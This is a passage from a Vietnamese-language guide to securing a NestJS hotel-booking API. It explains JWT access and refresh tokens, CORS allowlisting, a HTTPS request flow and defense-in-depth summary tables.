**JWT (JSON Web Token)** là cơ chế xác thực **stateless**, được ký bằng secret key, đảm bảo token không bị chỉnh sửa.

Cấu trúc JWT:

```
HEADER.PAYLOAD.SIGNATURE
```

JWT chứa thông tin người dùng (ID, role…) và được kiểm tra chữ ký mỗi request.

#### Mô hình Access Token + Refresh Token:

* **Access Token**: thời hạn ngắn (5 phút)
* **Refresh Token**: thời hạn dài (7 ngày), lưu DB, có thể revoke

Cách này giúp:

* Giảm rủi ro nếu access token bị lộ
* Chủ động thu hồi token khi có sự cố

---

### 4.6 Lớp 4: CORS (Cross-Origin Resource Sharing)

CORS giới hạn **domain nào được phép gọi API**.

Ví dụ:

* ✅ `https://hotel-app.com`
* ❌ `https://evil-site.com`

Chỉ các domain trong whitelist mới có thể truy cập API.

CORS giúp:

* Ngăn website độc hại gọi API
* Bảo vệ dữ liệu người dùng trên trình duyệt

---

### 4.7 Luồng bảo mật request hoàn chỉnh

```
Mobile App
│ POST /api/bookings
│ Authorization: Bearer <JWT>
│
│ HTTPS (TLS mã hóa)
▼
Railway / Heroku
│ TLS Termination
▼
NestJS App
│ 1. Kiểm tra CORS
│ 2. Xác thực JWT
│ 3. Kiểm tra hạn token
│ 4. Xử lý request
│ 5. Gắn security headers
▼
Response + Helmet Headers
```

---

### 4.8 Tổng kết bảo mật truyền dữ liệu

| Lớp       | Công nghệ      | Chống lại        |
| --------- | -------------- | ---------------- |
| HTTPS/TLS | TLS 1.3        | MITM, nghe lén   |
| HSTS      | Helmet         | SSL stripping    |
| JWT       | Passport + JWT | Chiếm session    |
| CORS      | enableCors     | Domain trái phép |

✅ **Kết quả:** Dữ liệu được mã hóa, xác thực và kiểm soát truy cập trong suốt quá trình truyền.

---

## 5. Kết luận

### Tổng quan triển khai bảo mật

| Yêu cầu bảo mật | Công nghệ           | Mức độ |
| --------------- | ------------------- | ------ |
| SQL Injection   | Prisma ORM          | ✅      |
| XSS             | Helmet + Sanitize   | ✅      |
| Dò mật khẩu     | Throttler + Lockout | ✅      |
| Truyền dữ liệu  | HTTPS + JWT + CORS  | ✅      |

### Kiến trúc Defense in Depth

Hệ thống áp dụng mô hình **phòng thủ nhiều lớp**, đảm bảo nếu một lớp bị vượt qua, các lớp khác vẫn bảo vệ hệ thống.

---

### Kết luận chính

1. Không có biện pháp bảo mật nào là đủ nếu đứng một mình
2. Luôn dùng thư viện đã được kiểm chứng
3. Không tin dữ liệu đầu vào
4. Luôn mã hóa dữ liệu khi truyền
5. Giới hạn request và thời gian sống token
6. Không bao giờ lưu mật khẩu dạng plaintext

---

